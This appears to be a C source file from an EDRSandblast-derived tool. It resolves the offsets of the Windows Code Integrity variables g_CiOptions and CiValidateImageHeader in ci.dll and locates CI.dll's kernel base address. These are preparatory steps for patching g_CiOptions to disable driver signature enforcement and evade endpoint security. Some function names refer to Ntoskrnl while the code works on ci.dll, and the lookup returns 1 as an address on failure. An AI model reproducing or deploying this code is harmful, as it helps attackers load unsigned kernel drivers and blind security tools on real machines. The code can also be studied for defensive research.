/*
Credits to : https://github.com/wavestone-cdt/EDRSandblast
*/
#include "common.h"

#include <tchar.h>
#include <stdio.h>
#include <shlwapi.h>
#include <psapi.h>

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#include "sandblast.h"

// Get the ci.dll path
TCHAR g_ciPath[MAX_PATH] = { 0 };
LPTSTR GetCiPath() {
    if (_tcslen(g_ciPath) == 0) {
        // Retrieves the system folder (eg C:\Windows\System32).
        GetSystemDirectory(g_ciPath, _countof(g_ciPath));

        // Compute ci.dll path.
        PathAppend(g_ciPath, TEXT("\\ci.dll"));
    }
    return g_ciPath;
}

// Function to load ci.dll offsets from the Internet by fetching symbol information
BOOL LoadNtoskrnlOffsetsFromInternet(BOOL delete_pdb) {

    // Load the symbol table from the `ci.dll` binary file.
    LPWSTR CiPath = GetCiPath();

    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(CiPath);
    if (sym_ctx == NULL) {
        return FALSE;
    }
    infoW_t(L"LoadSymbolsFromImageFile - Symbols from \"%s\" loaded", CiPath);

    // Retrieve the offset of `g_CiOptions`, which controls Code Integrity behavior.
    g_ciOffsets.st.g_CiOptions = GetSymbolOffset(sym_ctx, "g_CiOptions");

    // Retrieve the offset of `CiValidateImageHeader`, a function used in integrity checks.
    g_ciOffsets.st.CiValidateImageHeader = GetSymbolOffset(sym_ctx, "CiValidateImageHeader");

    // Unload the symbols after retrieving the required offsets.
    // If `delete_pdb` is TRUE, it ensures that temporary symbol files are removed.
    UnloadSymbols(sym_ctx, delete_pdb);

    // Ensure that at least one of the offsets was successfully retrieved.
   // If both offsets are 0, it indicates failure.
    if (!g_ciOffsets.st.g_CiOptions && !g_ciOffsets.st.CiValidateImageHeader) {
        return FALSE;
    }
    // Return TRUE if at least one offset was successfully retrieved.
    return TRUE;

}

// Function to print Ntoskrnl offsets with attribute names
void PrintNtoskrnlOffsets() {
    info_t("Ntoskrnl offsets:");
    info_t("g_CiOptions:\t\t 0x%llx", g_ciOffsets.st.g_CiOptions);
}

// Finds the base address of a kernel module by name
DWORD64 FindKernelModuleAddressByName(_In_ LPTSTR name) {
    LPVOID drivers[1024] = { 0 };
    DWORD cbNeeded;
    DWORD cDrivers = 0;
    TCHAR szDriver[1024] = { 0 };

    // Get a list of loaded kernel modules
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        cDrivers = cbNeeded / sizeof(drivers[0]);
        for (DWORD i = 0; i < cDrivers; i++) {

            // Get module name and compare it with the target name
            if (drivers[i] && GetDeviceDriverBaseName(drivers[i], szDriver, _countof(szDriver))) {
                if (_tcsicmp(szDriver, name) == 0) {
                    return (DWORD64)drivers[i];
                }
            }
        }
    }
    error("Could not resolve %s kernel module's address", name);

    return EXIT_FAILURE;
}

// Retrieves the base address of CI.dll
DWORD64 FindCIBaseAddress() {
    DWORD64 CiBaseAddress = FindKernelModuleAddressByName((LPTSTR)TEXT("CI.dll"));
    return CiBaseAddress;
}